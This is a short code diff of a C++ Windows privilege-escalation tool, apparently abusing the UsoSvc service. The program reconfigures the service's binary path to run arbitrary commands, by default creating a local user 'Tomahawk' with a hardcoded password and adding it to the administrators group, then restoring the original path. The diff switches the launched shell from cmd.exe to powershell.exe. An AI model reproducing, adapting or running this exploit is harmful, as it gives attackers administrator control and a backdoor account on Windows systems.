@@ -53,7 +53,7 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 
 	if (argc > 1)
 	{
-		const wchar_t* msg[6] = { L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"cmd.exe /c ", L"sc start UsoSvc", L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"C:\\WINDOWS\\system32\\svchost.exe - k netsvcs - p\"", L"sc start UsoSvc" };
+		const wchar_t* msg[6] = { L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"powershell.exe /c ", L"sc start UsoSvc", L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"C:\\WINDOWS\\system32\\svchost.exe - k netsvcs - p\"", L"sc start UsoSvc" };
 
 		const wchar_t* command = (std::wstring(msg[1]) + std::wstring(argv[1]) + std::wstring(L"\"")).data();
 
@@ -78,7 +78,7 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 	}
 	else
 	{
-		const wchar_t* msg[9] = { L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"cmd.exe /c net user /add Tomahawk RibSt3ak69 &\"", L"sc start UsoSvc", L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"cmd.exe /c net localgroup administrators /add Tomahawk & \"", L"sc start UsoSvc", L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"C:\\WINDOWS\\system32\\svchost.exe - k netsvcs - p\"", L"sc start UsoSvc" };
+		const wchar_t* msg[9] = { L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"powershell.exe /c net user /add Tomahawk RibSt3ak69 &\"", L"sc start UsoSvc", L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"powershell.exe /c net localgroup administrators /add Tomahawk & \"", L"sc start UsoSvc", L"sc stop UsoSvc", L"sc config UsoSvc binpath= \"C:\\WINDOWS\\system32\\svchost.exe - k netsvcs - p\"", L"sc start UsoSvc" };
 
 		printf("[\\] Progress: ");
 		for (int i = 0; i < 9; i++)
